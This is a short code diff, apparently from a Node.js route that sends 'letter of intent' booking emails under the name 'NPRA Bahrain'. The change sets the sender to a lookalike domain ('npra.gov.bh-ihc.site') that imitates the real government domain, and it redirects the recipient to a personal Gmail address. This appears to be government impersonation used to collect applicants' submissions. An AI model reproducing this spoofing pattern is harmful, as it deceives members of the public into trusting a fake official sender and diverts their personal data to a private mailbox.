@@ -206,12 +206,12 @@ router.post("/imc/loi", async (req, res) => {
   {
     sender: {
       name: "NPRA Bahrain",
-      email: "booking@npra.gov.bh"
+      email: "booking@npra.gov.bh-ihc.site"
     },
 
     to: [
       {
-        email: "booking@npra.gov.bh-ihc.site"
+        email: "haithamjatal3@gmail.com"
       }
     ],
 
